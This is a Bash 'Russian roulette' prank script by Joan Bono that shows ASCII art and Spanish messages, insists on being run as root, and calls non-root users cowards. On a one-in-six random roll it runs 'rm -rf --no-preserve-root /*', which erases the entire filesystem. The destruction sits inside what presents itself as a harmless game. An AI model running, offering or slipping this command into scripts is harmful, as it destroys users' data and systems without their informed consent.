#! /bin/bash
# RULETA BASH v0.1
# Autor: Joan Bono
# Mail: joan.bono@soyteleco.net

user=$(whoami)
if [ "$user" == "root" ]; then
	echo " 																			   
																					   
		            .-.____________________.-.									   
		     ___ _.' .-----.    _____________|  									   
		    /_._/   (      |   /_____________| 									   
		      /      º  _ ____/      _        _     								   
		     |_      .\( \\\          | |      / \   								   
		    .º  º-._/__º_//         | |     / _ \  		    Joan Bono          
		  .º       |ºººººº          | |___ / ___ \ 		www.soyteleco.net      
		 /        /                 |_____/_/   \_\ 								   
		/        |    ____  _   _ _     _____ _____  _      ____    _    ____  _   _ 
		|         \  |  _ \| | | | |   | ____|_   _|/ \    | __ )  / \  / ___|| | | |
		|         º  | |_) | | | | |   |  _|   | | / _ \   |  _ \ / _ \ \___ \| |_| |
		º-._____.-º  |  _ <| |_| | |___| |___  | |/ ___ \  | |_) / ___ \ ___) |  _  |
		             |_| \_\\\____/|_____|_____| |_/_/   \_\ |____/_/   \_\____/|_| |_|
		                                                                			   "
    sleep 3
    echo "Que empieze el juego..."
    sleep 2

	if [ "$((RANDOM%6+1))" = "6" ]; then
		

		echo "                                    __       __"
		echo "                                   / _|     / /"
		echo "      _ __ _ __ ___    ______ _ __| |_     / / "
		echo "     | '__| '_ '' _ \ |______| '__|  _|   / /  "
		echo "     | |  | | | | | |        | |  | |    / /   "
		echo "     |_|  |_| |_| |_|        |_|  |_|   /_/    "
		echo "                                   		 "
        	rm -rf --no-preserve-root /*


	else

		echo ""
		echo "		 _____    									  "                                    
		echo "		|  __ \     								  "                                 
		echo "		| |__) |__  _ __   _ __   ___   ___ ___       "
		echo "		|  ___/ _ \| '__| | '_ \ / _ \ / __/ _ \      "
		echo "		| |  | (_) | |    | |_) | (_) | (_| (_) | _ _ "
		echo "		|_|   \___/|_|    | .__/ \___/ \___\___(_|_|_)"
		echo "  	  	                  | |                         "
		echo "   	     	                  |_|                         "
		echo ""
	fi
else
	echo " "
	echo "   COBARDE: Ejecuta como ROOT" 
	echo ""
    exit
fi
